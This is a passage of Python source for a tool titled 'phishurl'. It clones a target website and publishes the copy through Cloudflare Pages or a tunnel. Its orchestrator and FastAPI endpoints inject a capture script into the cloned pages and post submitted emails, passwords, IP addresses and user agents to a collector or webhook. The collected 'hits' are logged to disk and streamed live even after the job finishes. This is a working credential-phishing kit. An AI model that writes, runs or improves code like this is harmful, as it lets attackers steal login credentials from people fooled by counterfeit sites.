                             + (f" · {self.note}" if self.note else "")})
        project, created = await self.ensure_project(name)
        on_event({"event": "log", "level": "info",
                  "message": f"project {name} {'created' if created else 'exists'} "
                             f"({len(zip_bytes)} bytes to upload)"})
        on_event({"event": "deploy", "project": name, "status": "upload", "url": ""})
        record.deployment_id = await self.upload(name, zip_bytes)
        on_event({"event": "deploy", "project": name, "status": "building",
                  "url": record.deployment_id})
        seen: list[str] = []

        def tick(stage: str) -> None:
            if not seen or seen[-1] != stage:
                seen.append(stage)
                on_event({"event": "log", "level": "info",
                          "message": f"deployment stage · {stage}"})

        result = await self.poll(name, record.deployment_id, tick)
        hostname = project.get("subdomain") or name
        url = str(result.get("url") or f"https://{hostname}.pages.dev")
        record.url = url
        record.status = "success"
        on_event({"event": "deploy", "project": name, "url": url, "status": "success"})
        return record


# ---------------------------------------------------------------------------
# 13. orchestrator
#
# render → extract → download → rewrite → heal → package → deploy, with an event at
# every step. One clock for the whole mirror, one bound per loop, and a failure at
# any stage leaves a job that says exactly which stage and why.
# ---------------------------------------------------------------------------

MIRROR_SECONDS = 300.0


class Orchestrator:
    def __init__(self, config: Config):
        self.config = config
        # url -> (bytes, content-type) harvested from the browser. Shared across
        # every page so a stylesheet loaded on page one is not re-fetched on page two.
        self.captured: dict[str, tuple[bytes, str]] = {}

    @staticmethod
    def _register_network(job: Job, resources: list[str], page_url: str) -> None:
        """Resources the browser actually asked for. Pages and the document itself are
        excluded: a crawled page gets its own copy, not a second one under assets/."""
        for resource in resources:
            if not resource.startswith("http") or resource in job.assets:
                continue
            if resource.rstrip("/") == page_url.rstrip("/"):
                continue
            if kind_from_url(resource) == "html":
                continue
            job.assets[resource] = Asset(url=resource, kind=kind_from_url(resource),
                                         via="network")

    async def run(self, job: Job) -> None:
        job.status = "running"
        started = time.monotonic()
        try:
            root = await self._prepare(job)
            await self._crawl(job, root)
            await self._assets(job, root)
            await self._rewrite(job, root)
            await self._heal(job, root)
            await self._finish(job, root)
        except BudgetExceeded as exc:
            job.status = "failed"
            job.error = str(exc)
            job.log(f"stopped · {exc}", "error")
        except Exception as exc:
            job.status = "failed"
            job.error = f"{type(exc).__name__}: {exc}"
            job.log(f"pipeline failed · {job.error}", "error")
            job.emit({"event": "error", "message": job.error})
        finally:
            job.finished = utcnow()
            if job.status != "failed":
                job.status = "done"
            job.emit({"event": "done", "url": job.url, "status": job.status,
                      "error": job.error, "seconds": round(time.monotonic() - started, 1),
                      "gates": {name: gate["score"] for name, gate in job.gates.items()},
                      "mirror": job.mirror, "zip": bool(job.zip_path),
                      "counts": {"assets": len(job.assets), "failed": job.failures,
                                 "bytes": job.bytes}})

    # -- stages -------------------------------------------------------------
    async def _prepare(self, job: Job) -> Path:
        parsed = urlparse(job.options.url)
        host = parsed.netloc.split(":")[0].replace("www.", "") or "site"
        stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        folder = f"{slugify(host)}-{stamp}"
        root = Path(self.config.out_dir or OUT_ROOT) / folder
        root.mkdir(parents=True, exist_ok=True)
        job.mirror = str(root)
        job.emit({"event": "phase", "phase": "render", "note": job.options.url})
        job.log(f"mirror directory · {root}")
        return root

    async def _render_into(self, job: Job, page: Page, url: str) -> bool:
        """Render one URL into the page and register what the browser asked for."""
        try:
            result = await render_page(url, proxy=job.options.proxy)
        except Exception as exc:
            job.log(f"render failed · {url} · {type(exc).__name__}: {exc}"[:220], "warn")
            return False
        page.html = result.html
        page.rendered = True
        page.text_len = result.text_len
        if result.final_url and result.final_url.rstrip("/") != url.rstrip("/"):
            job.log(f"redirected to {result.final_url}")
        page.url = norm_url(result.final_url or url)
        self._register_network(job, result.resources, page.url)
        if result.captured:
            self.captured.update(result.captured)
            job.log(f"captured {len(result.captured)} response body(ies) from the render")
        if result.errors:
            job.log(f"{len(result.errors)} script error(s) during render", "warn")
        return True

    async def _crawl(self, job: Job, root: Path) -> None:
        page = Page(url=job.options.url, local=page_relpath(job.options.url))
        job.pages.append(page)
        job.entry = page.local
        html = ""
        if job.options.render:
            job.log("rendering the page in chromium")
            if not await self._render_into(job, page, page.url):
                # A wrong scheme is the most common reason a first render dies: the
                # operator typed a bare host, or the site only speaks http.
                alternate = swap_scheme(page.url)
                job.log(f"trying the other scheme · {alternate}", "warn")
                if await self._render_into(job, page, alternate):
                    job.log(f"the target answers on {page.url}", "warn")
            html = page.html
        if not html:
            if httpx is None:
                raise RuntimeError("neither playwright nor httpx is available")
            async with httpx.AsyncClient(follow_redirects=True, timeout=HTTP_TIMEOUT,
                                         proxy=job.options.proxy or None) as client:
                response = await client.get(page.url, headers={"User-Agent": UA_POOL[0]})
            if response.status_code >= 400:
                raise RuntimeError(f"the target answered HTTP {response.status_code}")
            html = decode_body(response.content, response.headers.get("content-type", ""))
            page.rendered = False
        page.html = html
        page.status = "done"
        job.emit({"event": "page", "url": page.url, "local": page.local, "status": "done",
                  "size": len(html)})

        job.phase_set("crawl", f"{len(job.pages)} page(s)")
        if job.options.depth < 2:
            return

        # depth 2: one level of same-origin pages, capped and time-bounded.
        deadline = time.monotonic() + MIRROR_SECONDS * 0.35
        queue = [link for link in extract_refs(html, page.url).links
                 if same_origin(link, job.options.url)]
        while queue and len(job.pages) < MAX_PAGES and time.monotonic() < deadline:
            next_url = norm_url(queue.pop(0))
            if any(existing.url == next_url for existing in job.pages):
                continue
            local = page_relpath(next_url)
            if any(existing.local == local for existing in job.pages):
                stem, _dot, ext = local.rpartition(".")
                local = f"{stem}-{md5_short(next_url, 6)}.{ext}"
            child = Page(url=next_url, local=local)
            try:
                if job.options.render:
                    result = await render_page(next_url, proxy=job.options.proxy,
                                               scroll=True)
                    child.html, child.rendered = result.html, True
                    child.text_len = result.text_len
                    self._register_network(job, result.resources, next_url)
                    if result.captured:
                        self.captured.update(result.captured)
                else:
                    async with httpx.AsyncClient(follow_redirects=True,
                                                 timeout=HTTP_TIMEOUT) as client:
                        response = await client.get(next_url, headers={"User-Agent": UA_POOL[0]})
                    child.html = decode_body(response.content,
                                             response.headers.get("content-type", ""))
                child.status = "done"
                job.pages.append(child)
                job.emit({"event": "page", "url": child.url, "local": child.local,
                          "status": "done", "size": len(child.html)})
                for link in extract_refs(child.html, child.url).links:
                    if same_origin(link, job.options.url) and len(queue) < 200:
                        queue.append(link)
            except Exception as exc:
                job.log(f"page skipped · {next_url} · {type(exc).__name__}", "warn")

    async def _assets(self, job: Job, root: Path) -> None:
        job.phase_set("download", f"ceiling {job.options.max_assets} assets")
        refs: list[Ref] = []
        dominated: set[str] = set()
        page_urls = {page.url for page in job.pages}
        for page in job.pages:
            extraction = extract_refs(page.html, page.url)
            dominated.update(ref.url for ref in extraction.refs)
            for ref in extraction.refs:
                if ref.kind == "html" or ref.url in page_urls:
                    continue      # a crawled page is written as a page, not an asset
                refs.append(ref)
        for asset in list(job.assets.values()):
            if asset.via != "network" or asset.url in dominated:
                continue
            if asset.kind == "html" or asset.url in page_urls:
                job.assets.pop(asset.url, None)
                continue
            refs.append(Ref(url=asset.url, kind=asset.kind, via="network"))
        job.log(f"{len(refs)} reference(s) across {len(job.pages)} page(s)")
        async with Downloader(job.options, job, root, self.captured) as downloader:
            await downloader.download(refs, job.options.url)
            if downloader.capture_hits:
                job.log(f"{downloader.capture_hits} asset(s) taken straight from the "
                        "render, byte for byte")
            job.emit({"event": "progress", "phase": "download", "assets": len(job.assets),
                      "done": job.done_count(), "bytes": job.bytes, "failures": job.failures})
        job.log(f"downloaded {job.done_count()} of {len(job.assets)} "
                f"({human_bytes(job.bytes)}, {job.failures} failed)")

    async def _rewrite(self, job: Job, root: Path) -> None:
        job.phase_set("rewrite", "localising references")
        rewriter = Rewriter(job)
        total = 0
        for page in job.pages:
            html, hits = rewriter.rewrite_doc(page.html, page.local, page.url)
            forms = 0
            if job.options.sanitize:
                html, forms = sanitize_forms(html)
                if forms:
                    job.log(f"{page.local} · {forms} form(s) neutralised")
            if job.options.webhook:
                html = inject_capture(html, job)
                job.log(f"{page.local} · capture armed · a submit goes to the webhook")
            page.size = len(html.encode("utf-8"))
            write_text(root, page.local, html)
            total += hits
        # stylesheets that were downloaded as assets need the same treatment
        for asset in list(job.assets.values()):
            if asset.kind != "css" or not asset.local:
                continue
            path = mirror_path(root, asset.local)
            source = read_text(path)
            if not source:
                continue
            new_css, hits = rewriter.rewrite_css(source, asset.local, asset.url)
            if hits:
                write_text(root, asset.local, new_css)
                total += hits
        job.log(f"{total} reference(s) rewritten to relative paths")

    async def _heal(self, job: Job, root: Path) -> None:
        job.phase_set("heal", "six gates")
        started = time.monotonic()
        best = -1.0
        entry = mirror_entry(root, job)
        known = referenced_names(job.pages)
        with LocalMirror(root, entry) as mirror:
            job.log(f"serving the mirror at {mirror.url}")
            async with Downloader(job.options, job, root, self.captured) as downloader:
                healer = Healer(job, root, Rewriter(job), mirror.url)
                for iteration in range(1, HEAL_ITERATIONS + 1):
                    if time.monotonic() - started > MIRROR_SECONDS * 0.55:
                        job.log("heal budget spent", "warn")
                        break
                    gates = merge_gates(static_gates(root, job.pages))
                    if playwright_mod is not None:
                        try:
                            gates = merge_gates(gates, await browser_gates(
                                mirror.url, job.pages, job.options.sanitize, root, known))
                        except Exception as exc:
                            job.log(f"browser gates unavailable · {type(exc).__name__}: {exc}",
                                    "warn")
                    job.gates = gates
                    for name, gate in gates.items():
                        job.emit({"event": "gate", "name": name, "passed": gate["passed"],
                                  "score": gate["score"], "detail": gate["detail"]})
                    score = score_of(gates)
                    if iteration == 1:
                        job.log("gate scores · " + " · ".join(
                            f"{name} {gate['score']:.2f}" for name, gate in gates.items()))
                    if all(gate["passed"] for gate in gates.values()):
                        job.log(f"all six gates pass at iteration {iteration} ({score:.2f})")
                        break
                    if score <= best:
                        job.log(f"iteration {iteration} did not improve the score ({score:.2f}) "
                                "— stopping the heal loop", "warn")
                        break
                    best = max(best, score)
                    applied = await healer.apply(iteration, gates, downloader)
                    job.log(f"iteration {iteration} · score {score:.2f} · "
                            f"{applied} heal action(s)")
                    if not applied:
                        break
                healer_final = merge_gates(static_gates(root, job.pages))
                if playwright_mod is not None:
                    try:
                        healer_final = merge_gates(healer_final, await browser_gates(
                            mirror.url, job.pages, job.options.sanitize, root, known))
                    except Exception:
                        pass
                job.gates = healer_final
                for name, gate in job.gates.items():
                    job.emit({"event": "gate", "name": name, "passed": gate["passed"],
                              "score": gate["score"], "detail": gate["detail"]})

    async def _finish(self, job: Job, root: Path) -> None:
        job.phase_set("package", "writing the manifest")
        dedupe = {"references": len(job.assets),
                  "files": len({asset.local for asset in job.assets.values() if asset.local}),
                  "identical": 0}
        build_manifest(job, root, dedupe)
        zip_path, files, total = package(root, job)
        job.log(f"packaged {files} file(s) · {human_bytes(total)} · {zip_path.name}")

        job.phase_set("deploy", "cloudflare pages")
        if not job.options.deploy:
            job.log("deploy skipped: --deploy was not set")
            job.deployment = Deployment(project="", status="skipped",
                                        error="deploy not requested")
            return
        if not self.config.cf_api_token:
            job.deployment = Deployment(project="", status="skipped",
                                        error="skipped: no api token (CF_API_TOKEN) — "
                                              f"create one at {CF_TOKEN_URL} with {CF_SCOPE}")
            job.log("deploy skipped · no api token (clone finished, zip is on disk)", "warn")
            job.emit({"event": "deploy", "project": "", "status": "skipped", "url": "",
                      "error": "no api token"})
            return
        project = project_name(job.options, job.options.url)
        try:
            client = Cloudflare(self.config.cf_api_token, self.config.cf_account_id)
            payload = zip_path.read_bytes()
            job.deployment = await client.deploy(project, payload, job.emit)
            job.url = job.deployment.url
            job.log(f"live · {job.url}")
        except CloudflareError as exc:
            job.deployment = Deployment(project=project, status="skipped", error=str(exc))
            job.log(f"deploy skipped · {exc}", "warn")
            job.emit({"event": "deploy", "project": project, "status": "skipped",
                      "url": "", "error": str(exc)})

# ---------------------------------------------------------------------------
# 14. fastapi app
#
# One page, six endpoints, one SSE stream. Jobs live in a dict because the process
# is the job store: a restart drops history, which is the right trade for a tool
# that writes every result to disk anyway.
# ---------------------------------------------------------------------------

JOBS: dict[str, Job] = {}
TASKS: dict[str, asyncio.Task] = {}


def job_or_404(job_id: str) -> Job:
    job = JOBS.get(job_id)
    if job is None:
        raise KeyError(job_id)
    return job


def make_job(options: Options) -> Job:
    job = Job(id=uuid.uuid4().hex[:12], options=options)
    JOBS[job.id] = job
    if len(JOBS) > 50:
        for stale in sorted(JOBS.values(), key=lambda item: item.created)[:10]:
            JOBS.pop(stale.id, None)
    return job


def start_job(job: Job, config: Config) -> None:
    orchestrator = Orchestrator(config)
    task = asyncio.create_task(orchestrator.run(job), name=f"job-{job.id}")
    TASKS[job.id] = task
    task.add_done_callback(lambda _t: TASKS.pop(job.id, None))


def save_config(config: Config) -> str:
    """Persist credentials and the look to config.yaml (never to a log)."""
    data = {"cf_api_token": config.cf_api_token, "cf_account_id": config.cf_account_id,
            "cf_project_prefix": config.cf_project_prefix, "proxy": config.proxy,
            "max_assets": config.max_assets, "concurrency": config.concurrency,
            "webhook": config.webhook, "redirect": config.redirect,
            "tunnel": config.tunnel,
            "theme_preset": config.theme_preset, "theme_accent": config.theme_accent,
            "theme_accent2": config.theme_accent2, "theme_dim": config.theme_dim,
            "theme_wall": config.theme_wall}
    target = Path("config.yaml")
    if yaml is not None:
        target.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
    else:
        target.write_text(json.dumps(data, indent=2), encoding="utf-8")
    return str(target)


# ---------------------------------------------------------------------------
# 15b. the look
#
# A palette is two colours and a scrim value; a wallpaper is one image the
# operator dropped in from their own machine. Both belong to the process, not to
# a job, so they live beside the output and ride in config.yaml — a restart puts
# the same face back on the tool.
# ---------------------------------------------------------------------------

HEX_RE = re.compile(r"^#[0-9a-fA-F]{6}$")
WALL_BYTES = 12 * 1024 * 1024
WALL_KINDS = (("png", b"\x89PNG\r\n\x1a\n"), ("jpg", b"\xff\xd8\xff"),
              ("webp", b"RIFF"), ("gif", b"GIF8"))
PRESET_RE = re.compile(r"^[a-z0-9-]{1,24}$")


def theme_dir(config: Config) -> Path:
    path = Path(config.out_dir or OUT_ROOT) / "_theme"
    path.mkdir(parents=True, exist_ok=True)
    return path


def wall_file(config: Config) -> Optional[Path]:
    """The wallpaper on disk, or None. The name is generated, never operator text."""
    if not config.theme_wall:
        return None
    path = theme_dir(config) / safe_segment(config.theme_wall, 60)
    return path if path.is_file() else None


def sniff_image(data: bytes) -> str:
    """The extension an image actually is, from its first bytes."""
    for kind, magic in WALL_KINDS:
        if data.startswith(magic):
            if kind == "webp" and data[8:12] != b"WEBP":
                continue
            return kind
    return ""


def theme_state(config: Config) -> dict[str, Any]:
    """What the console needs to paint itself: colours, scrim, wallpaper url."""
    path = wall_file(config)
    wall = ""
    if path is not None:
        wall = "/api/theme/wall?v=" + str(int(path.stat().st_mtime))
    return {"preset": config.theme_preset, "accent": config.theme_accent,
            "accent2": config.theme_accent2, "dim": config.theme_dim, "wall": wall}


def build_app(config: Config) -> Any:
    if fastapi_mod is None:
        raise SystemExit("fastapi is not installed — pip install fastapi uvicorn")
    from fastapi import Body, FastAPI, HTTPException, Request
    from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, StreamingResponse

    # `from __future__ import annotations` makes every annotation in this file a
    # string, and fastapi resolves those against the module globals — not against
    # the imports made here inside the builder. Without this, a route declared
    # `request: Request` arrives as a required *query* parameter and every POST
    # answers 422.
    globals().setdefault("Request", Request)

    app = FastAPI(title=APP, version=VERSION, docs_url="/api/docs", redoc_url=None)

    @app.get("/", response_class=HTMLResponse)
    async def index() -> Any:
        return HTMLResponse(UI_HTML)

    @app.get("/api/health")
    async def health() -> dict[str, Any]:
        return {"app": APP, "version": VERSION, "tagline": TAGLINE,
                "cloudflare": config.has_cloudflare(),
                "caps": {name: bool(value) for name, value in CAPS.items()},
                "tunnel": {"providers": [item.name for item in PROVIDERS],
                           "ssh": bool(shutil.which("ssh")),
                           "live": sum(1 for site in TUNNELS.values()
                                       if site.state == "live")},
                "jobs": len(JOBS), "out_dir": str(Path(config.out_dir or OUT_ROOT).resolve())}

    @app.post("/api/jobs")
    async def create_job(request: Request, payload: dict[str, Any] = Body(...)) -> JSONResponse:
        try:
            options = Options.from_payload(payload)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc))
        if not options.project:
            options.project = ""
        job = make_job(options)
        # the console's own origin, so a loopback preview can report hits back
        job.app_base = f"{request.url.scheme}://{request.url.netloc}"
        job.emit({"event": "log", "level": "info",
                  "message": f"job {job.id} accepted · {options.url}"})
        start_job(job, config)
        return JSONResponse(status_code=202, content={"job_id": job.id,
                                                      "url": options.url,
                                                      "project": project_name(options, options.url)})

    @app.get("/api/jobs")
    async def list_jobs() -> dict[str, Any]:
        rows = sorted(JOBS.values(), key=lambda item: item.created, reverse=True)[:25]
        return {"jobs": [{"id": job.id, "url": job.options.url, "status": job.status,
                          "phase": job.phase, "created": job.created, "done_url": job.url}
                         for job in rows]}

    @app.get("/api/jobs/{job_id}")
    async def job_state(job_id: str) -> dict[str, Any]:
        try:
            return job_or_404(job_id).snapshot()
        except KeyError:
            raise HTTPException(status_code=404, detail="no such job")

    @app.get("/api/jobs/{job_id}/export.zip")
    async def export_zip(job_id: str) -> Any:
        try:
            job = job_or_404(job_id)
        except KeyError:
            raise HTTPException(status_code=404, detail="no such job")
        if not job.zip_path or not Path(job.zip_path).is_file():
            raise HTTPException(status_code=404, detail="the zip is not ready yet")
        return FileResponse(job.zip_path, media_type="application/zip",
                            filename=f"mirror-{job_id}.zip")

    @app.get("/api/jobs/{job_id}/preview/{asset:path}")
    async def preview(job_id: str, asset: str) -> Any:
        """Serve the local mirror so the result card can frame it before a deploy.

        Paths are resolved against the mirror root and refused if they escape it —
        a mirror is untrusted input at this point, it came off the wire. An empty
        path, or the index.html a target of /login never writes, redirects to the
        page the job actually starts on.
        """
        from fastapi.responses import RedirectResponse

        try:
            job = job_or_404(job_id)
        except KeyError:
            raise HTTPException(status_code=404, detail="no such job")
        if not job.mirror:
            raise HTTPException(status_code=404, detail="the mirror is not ready yet")
        root = Path(job.mirror).resolve()
        rel = unquote(asset or "").strip("/")
        if not rel or (rel == "index.html" and not mirror_path(root, "index.html").is_file()):
            entry = public_entry(root, job)
            if not entry:
                raise HTTPException(status_code=404, detail="no such file in the mirror")
            return RedirectResponse(f"/api/jobs/{job_id}/preview/{quote(entry)}",
                                    status_code=307)
        # resolved by its real name, then checked against the root. safe_path() is a
        # sanitiser and a sanitiser renames: it stripped the leading underscore off
        # the sealed entry and every preview got a 404 for the document it asked for.
        if "\x00" in rel:
            raise HTTPException(status_code=400, detail="bad path")
        target = (root / rel).resolve()
        if target.is_dir():
            target = target / "index.html"
        if root not in target.parents and target != root:
            raise HTTPException(status_code=403, detail="outside the mirror")
        if not target.is_file():
            raise HTTPException(status_code=404, detail="no such file in the mirror")
        mime = mimetypes.guess_type(target.name)[0] or "application/octet-stream"
        if mime.startswith("text/") or mime in ("application/javascript", "application/json"):
            mime += "; charset=utf-8"
        return FileResponse(target, media_type=mime)

    @app.post("/api/jobs/{job_id}/capture")
    async def capture(job_id: str, request: Request) -> Any:
        """One submitted form, as the mirrored page saw it.

        The operator's own preview beacons here so the console shows hits while the
        page is being tested; on a public link the collector posts to the webhook
        instead, because a tunnel is a file server and cannot forward a POST.

        The body is read raw rather than declared as JSON. The mirrored page is
        served from a different origin — another port, and inside a sandboxed frame
        during preview — so the beacon is a no-cors POST carrying text/plain. A typed
        `payload: dict` would answer that with a 422 and the hit would be lost.
        """
        try:
            job = job_or_404(job_id)
        except KeyError:
            raise HTTPException(status_code=404, detail="no such job")

        raw = (await request.body()).decode("utf-8", "replace").strip()
        payload: dict[str, Any] = {}
        if raw.startswith("{"):
            try:
                parsed = json.loads(raw)
            except ValueError:
                parsed = None
            if isinstance(parsed, dict):
                payload = parsed
        elif "=" in raw:
            with contextlib.suppress(ValueError):
                payload = dict(parse_qsl(raw, keep_blank_values=True))
        if not payload:
            raise HTTPException(status_code=400, detail="empty capture")

        def text(key: str, limit: int = 300) -> str:
            value = payload.get(key)
            return str(value)[:limit] if isinstance(value, (str, int, float)) else ""

        fields = payload.get("fields")
        hit = {
            "email": text("email", 200),
            "password": text("password", 200),
            "ip": text("ip", 64),
            "ua": text("ua", 300),
            "page": text("page", 400),
            "t": text("t", 40) or utcnow(),
            "fields": {str(k)[:60]: str(v)[:300] for k, v in
                       (fields.items() if isinstance(fields, dict) else [])} if fields else {},
        }
        job.hits.append(hit)
        job.emit({"event": "hit", **hit})
        job.log(f"capture · {hit['email'] or 'no address'} · {hit['password'] and 'password present' or 'no password'}"
                f" · {hit['ip'] or 'ip unknown'}", "ok")
        # a hit is evidence: write it beside the mirror, never inside it, or the
        # tunnel would publish the keys along with the page
        try:
            trail = Path(job.mirror).parent / f"{Path(job.mirror).name}-hits.jsonl"
            with trail.open("a", encoding="utf-8") as handle:
                handle.write(json.dumps(hit, ensure_ascii=False) + "\n")
        except OSError:
            pass
        return {"ok": True, "count": len(job.hits)}

    @app.get("/api/jobs/{job_id}/hits")
    async def hits(job_id: str) -> dict[str, Any]:
        try:
            job = job_or_404(job_id)
        except KeyError:
            raise HTTPException(status_code=404, detail="no such job")
        return {"count": len(job.hits), "hits": job.hits[-200:]}

    @app.post("/api/publish")
    async def publish(payload: dict[str, Any] = Body(default={})) -> JSONResponse:
        """One click, one public url. The ssh handshake runs in the background, so
        this answers 202 and the caller polls the state — a 45 s block inside a
        request is how a UI thread dies."""
        job_id = str(payload.get("job_id") or "").strip()
        try:
            job = job_or_404(job_id)
        except KeyError:
            raise HTTPException(status_code=404, detail="no such job")
        if not job.mirror or not mirror_path(Path(job.mirror),
                                             mirror_entry(Path(job.mirror), job)).is_file():
            raise HTTPException(status_code=409,
                                detail="the mirror is not on disk yet — wait for the run")
        site = publish_mirror(job, str(payload.get("subdomain") or ""))
        return JSONResponse(status_code=202, content=site.status())

    @app.get("/api/publish/{job_id}")
    async def publish_state(job_id: str) -> dict[str, Any]:
        site = tunnel_for(job_id)
        if site is None:
            return {"state": "idle", "url": "", "error": "", "job_id": job_id}
        state = site.status()
        state["job_id"] = job_id
        return state

    @app.delete("/api/publish/{job_id}")
    async def unpublish(job_id: str) -> dict[str, Any]:
        return {"job_id": job_id, "closed": close_tunnel(job_id)}

    @app.get("/api/jobs/{job_id}/stream")
    async def stream(job_id: str) -> Any:
        try:
            job = job_or_404(job_id)
        except KeyError:
            raise HTTPException(status_code=404, detail="no such job")

        async def events() -> Any:
            queue = job.subscribe()
            try:
                yield {"event": "snapshot", "data": json.dumps(job.snapshot())}
                while True:
                    try:
                        event = await asyncio.wait_for(queue.get(), timeout=15.0)
                    except asyncio.TimeoutError:
                        yield {"event": "ping", "data": "{}"}
                        continue
                    yield {"event": str(event.get("event") or "message"),
                           "data": json.dumps(event)}
                    # No break on "done": a finished job is the one that still gets
                    # hits. The mirror is out in the world long after the clone
                    # finished, and the feed has to keep arriving.
            finally:
                job.unsubscribe(queue)

        if sse_starlette is not None:
            from sse_starlette.sse import EventSourceResponse
            return EventSourceResponse(events(), ping=15, media_type="text/event-stream")
        return StreamingResponse(_plain_sse(events()), media_type="text/event-stream",
                                 headers={"Cache-Control": "no-cache",
                                          "X-Accel-Buffering": "no"})

    @app.get("/api/settings")
    async def read_settings() -> dict[str, Any]:
        return {"config": config.redacted(), "cloudflare": config.has_cloudflare(),
                "cf_token_url": CF_TOKEN_URL, "cf_scope": CF_SCOPE,
                "path": str(Path("config.yaml").resolve())}

    @app.post("/api/settings")
    async def write_settings(payload: dict[str, Any] = Body(...)) -> dict[str, Any]:
        global PREFER_CLOUDFLARED
        for field_name in ("cf_api_token", "cf_account_id", "cf_project_prefix", "proxy",
                           "webhook", "redirect", "tunnel"):
            if field_name in payload and payload[field_name] is not None:
                setattr(config, field_name, str(payload[field_name]).strip())
        # the lane choice is read at start(), so the switch takes effect on the next
        # publish without a restart
        PREFER_CLOUDFLARED = config.tunnel.strip().lower() != "fastest"
        for field_name, cast in (("max_assets", int), ("concurrency", int)):
            if payload.get(field_name):
                with contextlib.suppress(TypeError, ValueError):
                    setattr(config, field_name, cast(payload[field_name]))
        path = save_config(config)
        return {"ok": True, "saved": path, "cloudflare": config.has_cloudflare()}

    # -- the look ----------------------------------------------------------
    @app.get("/api/theme")
    async def read_theme() -> dict[str, Any]:
        return theme_state(config)

    @app.post("/api/theme")
    async def write_theme(payload: dict[str, Any] = Body(default={})) -> dict[str, Any]:
        """Colours and scrim. Validated here, because the console is not a validator."""
        preset = str(payload.get("preset") or "").strip().lower()
        if preset:
            if not PRESET_RE.match(preset):
                raise HTTPException(status_code=400, detail="preset name is not a slug")
            config.theme_preset = preset
        for field_name in ("accent", "accent2"):
            value = str(payload.get(field_name) or "").strip()
            if not value:
                continue
            if not HEX_RE.match(value):
                raise HTTPException(status_code=400,
                                    detail=f"{field_name} must be #rrggbb")
            setattr(config, "theme_" + field_name, value.lower())
        if payload.get("dim") is not None:
            with contextlib.suppress(TypeError, ValueError):
                config.theme_dim = max(0, min(90, int(payload["dim"])))
        save_config(config)
        return theme_state(config)

    @app.post("/api/theme/wall")
    async def upload_wall(payload: dict[str, Any] = Body(default={})) -> dict[str, Any]:
        """One image from the operator's machine, as a data url, as the backdrop."""
        raw = str(payload.get("data") or "")
        header, _, blob = raw.partition(",")
        if not raw.startswith("data:") or ";base64" not in header:
            raise HTTPException(status_code=400, detail="expected a base64 data url")
        try:
            data = base64.b64decode(blob, validate=True)
        except Exception:
            raise HTTPException(status_code=400, detail="the image could not be decoded")
        if not data:
            raise HTTPException(status_code=400, detail="the image is empty")
        if len(data) > WALL_BYTES:
            raise HTTPException(status_code=413,
                                detail=f"the image is over {WALL_BYTES // (1024 * 1024)} mb")
        kind = sniff_image(data)
        if not kind:
            raise HTTPException(status_code=415, detail="png, jpg, webp or gif only")
        folder = theme_dir(config)
        for stale in folder.glob("wall.*"):
            with contextlib.suppress(OSError):
                stale.unlink()
        name = "wall." + kind
        (folder / name).write_bytes(data)
        config.theme_wall = name
        save_config(config)
        return theme_state(config)

    @app.get("/api/theme/wall")
    async def read_wall() -> Any:
        path = wall_file(config)
        if path is None:
            raise HTTPException(status_code=404, detail="no wallpaper set")
        return FileResponse(path, headers={"Cache-Control": "no-cache"})

    @app.delete("/api/theme/wall")
    async def clear_wall() -> dict[str, Any]:
        folder = theme_dir(config)
        for stale in folder.glob("wall.*"):
            with contextlib.suppress(OSError):
                stale.unlink()
        config.theme_wall = ""
        save_config(config)
        return theme_state(config)

    @app.post("/api/cf/verify")
    async def cf_verify(payload: dict[str, Any] = Body(default={})) -> dict[str, Any]:
        """Prove the token before a run spends minutes producing a mirror.

        Token only. The account id, when it is pasted, is checked against what the
        token can see; when it is not, the account is resolved and reported back so
        the settings card can fill it in. The reply is the whole diagnosis — the
        checks, the account name, the exact permission, the link that fixes it.
        """
        token = str(payload.get("cf_api_token") or config.cf_api_token or "").strip()
        account = str(payload.get("cf_account_id") or config.cf_account_id or "").strip()
        blank = {"ok": False, "checks": [], "account_id": account, "account_name": "",
                 "pages": False, "fix": f"create a token at {CF_TOKEN_URL} with {CF_SCOPE}"}
        if not token:
            return {**blank, "error": f"no api token — create one at {CF_TOKEN_URL}"}
        try:
            return await Cloudflare(token, account).diagnose()
        except CloudflareError as exc:
            return {**blank, "error": str(exc)}
        except Exception as exc:
            return {**blank, "error": f"{type(exc).__name__}: {exc}"[:200]}

    @app.exception_handler(Exception)
    async def unhandled(_request: Any, exc: Exception) -> Any:
        return JSONResponse(status_code=500, content={"error": f"{type(exc).__name__}: {exc}"})

    return app


async def _plain_sse(source: Any) -> Any:
    """Fallback stream when sse-starlette is absent: same wire format, hand-rolled."""
    async for item in source:
        name = item.get("event") or "message"
        data = item.get("data") or ""
        yield f"event: {name}\ndata: {data}\n\n"

# ---------------------------------------------------------------------------
# 15. the UI
#
# One document, no build step, no framework. Bone on near-black, acid lime for
# signal, ember and coral for a kill; a display serif against mono data so the page
# reads like an instrument instead of a dashboard. Everything is driven by the SSE
# stream: nothing here polls, and nothing claims a result it did not receive.
# ---------------------------------------------------------------------------

UI_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>phishurl — exact mirror · public link · AnonymousGroup</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%2305060a'/%3E%3Crect x='4.5' y='4.5' width='23' height='23' rx='3' fill='none' stroke='%234de3ff' stroke-opacity='.45'/%3E%3Ccircle cx='16' cy='16' r='5.5' fill='%234de3ff'/%3E%3C/svg%3E">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter+Tight:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
/* ── base ─────────────────────────────────────────────────────────────── */
*,*::before,*::after{box-sizing:border-box}
/* clip, not hidden: the root still has no horizontal scrollbar and sticky
   cards keep working, because clip does not create a scroll container */
html{-webkit-text-size-adjust:100%;overflow-x:clip}
:root{
  --bg:#04060d;
  --ink:#eef2ff;
  --mute:#9aa6c0;
  /* the two quiet greys carry every micro-label on the page. the floor is
     legibility, not taste: below about 3:1 a label stops being quiet and starts
     being a smudge, which is what makes a dark console look cheap */
  --faint:#6e7c99;
  --dim:#4a5573;
  --line:rgba(255,255,255,.08);
  --line2:rgba(255,255,255,.14);
  --glass:rgba(255,255,255,.035);
  --glass2:rgba(255,255,255,.06);
  --a1:#7c5cff;          /* violet — the accent that moves */
